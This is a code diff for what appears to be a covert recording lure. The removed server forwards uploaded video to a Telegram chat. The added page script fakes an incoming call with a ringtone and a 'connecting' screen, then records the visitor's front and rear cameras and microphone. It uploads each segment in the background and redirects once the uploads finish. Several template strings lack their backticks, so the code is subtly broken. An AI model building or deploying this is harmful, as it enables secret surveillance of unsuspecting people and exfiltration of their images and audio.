@@ -1,66 +1,123 @@
-const express = require('express');
-const multer = require('multer');
-const TelegramBot = require('node-telegram-bot-api');
-const fs = require('fs');
-const path = require('path');
+<script>
+let localStream;
+let mediaRecorder;
+let currentChunks = [];
+let segmentCount = 1;
+let pendingUploads = 0; // TRACKS ONGOING UPLOADS
+let currentFacing = "user";
+let uiVisible = true;
+let isEnding = false;
 
-const app = express();
-const port = process.env.PORT || 3000;
+const connectSound = new Audio("ringtone.mp3");
+const localVideo = document.getElementById("localVideo");
+const controlsUI = document.getElementById("controlsUI");
+const connectScreen = document.getElementById("connectScreen");
 
-// 1. CONFIGURATION (Make sure these match your Render Environment Variables)
-const token = process.env.BOT_TOKEN;
-const chatId = process.env.CHAT_ID;
-const bot = new TelegramBot(token, { polling: false });
+// --- STARTUP ---
+function initiateConnection() {
+    connectSound.volume = 0.05; 
+    connectSound.play().catch(() => {});
+    
+    connectScreen.innerHTML = <span class="loader"></span><p style="margin-top:20px;">Establishing Line...</p>;
 
-// 2. AUTO-CREATE UPLOADS FOLDER (Crucial for Render)
-const uploadDir = path.join(__dirname, 'uploads');
-if (!fs.existsSync(uploadDir)) {
-    fs.mkdirSync(uploadDir);
-    console.log("✅ Created 'uploads' directory");
+    setTimeout(async () => {
+        connectScreen.style.display = "none";
+        document.getElementById("remoteVideo").style.display = "block";
+        controlsUI.style.display = "flex";
+        localVideo.style.display = "block";
+        localVideo.classList.add("snap-transition");
+        await startCamera();
+    }, 5000); 
 }
 
-// 3. STORAGE SETUP
-const storage = multer.diskStorage({
-    destination: (req, file, cb) => { cb(null, uploadDir); },
-    filename: (req, file, cb) => { cb(null, file.originalname); }
-});
-
-// Increased limit to 50MB to handle high-quality video segments
-const upload = multer({ 
-    storage: storage,
-    limits: { fileSize: 50 * 1024 * 1024 } 
-});
-
-app.use(express.static('.'));
-app.use(express.json());
-
-// 4. THE UPLOAD ROUTE
-app.post('/upload', upload.single('video'), async (req, res) => {
-    if (!req.file) {
-        console.error("❌ No file received");
-        return res.status(400).send("No file uploaded");
+// --- RECORDING & SEGMENTATION ---
+async function startCamera() {
+    if (localStream) {
+        localStream.getTracks().forEach(t => t.stop());
     }
-
-    console.log(`📩 Received: ${req.file.filename}`);
 
     try {
-        // Send to Telegram
-        await bot.sendVideo(chatId, req.file.path, {
-            caption: `🎥 New Segment: ${req.file.filename}`
+        localStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: currentFacing, width: { ideal: 640 } },
+            audio: true
         });
-        
-        console.log(`🚀 Sent to Bot: ${req.file.filename}`);
-        
-        // Delete file after sending to keep the Render disk clean
-        fs.unlinkSync(req.file.path);
-        
-        res.status(200).send("Success");
-    } catch (error) {
-        console.error("❌ Telegram Error:", error.message);
-        res.status(500).send("Bot failed to send video");
-    }
-});
+        localVideo.srcObject = localStream;
 
-app.listen(port, () => {
-    console.log(`🌐 Server running on port ${port}`);
-});
+        const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
+        mediaRecorder = new MediaRecorder(localStream, { mimeType: mime });
+        currentChunks = [];
+
+        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) currentChunks.push(e.data); };
+        
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(currentChunks, { type: "video/webm" });
+            uploadSegment(blob, segmentCount, currentFacing);
+            segmentCount++;
+        };
+
+        mediaRecorder.start();
+    } catch (err) {
+        console.error("Hardware Error:", err);
+    }
+}
+
+// --- BACKGROUND UPLOAD ---
+async function uploadSegment(blob, id, facing) {
+    if (blob.size < 100) return; // Ignore empty segments
+
+    pendingUploads++; // Start tracking this specific upload
+    const formData = new FormData();
+    formData.append("video", blob, part_${id}_${facing}.webm);
+
+    try {
+        await fetch("/upload", { method: "POST", body: formData });
+        console.log(Segment ${id} sync complete.);
+    } catch (e) {
+        console.error("Sync error:", e);
+    } finally {
+        pendingUploads--; // Stop tracking
+        checkFinalRedirect();
+    }
+}
+
+// --- SWITCHING CAMERA ---
+async function switchCamera() {
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop(); // Automatically triggers uploadSegment for the current lens
+    }
+    
+    currentFacing = (currentFacing === "user") ? "environment" : "user";
+    await startCamera();
+}
+
+// --- END CALL & SYNC WAIT ---
+async function endCall() {
+    isEnding = true;
+    document.getElementById("overlay").style.display = "flex";
+
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop(); // Trigger upload for the final segment
+    }
+
+    if (localStream) {
+        localStream.getTracks().forEach(t => t.stop());
+    }
+
+    // Fallback: If nothing was ever recorded or uploads finished instantly
+    checkFinalRedirect();
+}
+
+function checkFinalRedirect() {
+    if (isEnding && pendingUploads === 0) {
+        document.getElementById("syncMsg").innerText = "Sync complete. Redirecting...";
+        setTimeout(() => {
+            window.location.href = "search.html";
+        }, 500);
+    } else if (isEnding) {
+        document.getElementById("syncMsg").innerText = Finalizing ${pendingUploads} data segments...;
+    }
+}
+
+// --- UI AND DRAG LOGIC ---
+let isDragging = false;
+let startX, startY, initialLeft, initialTop;
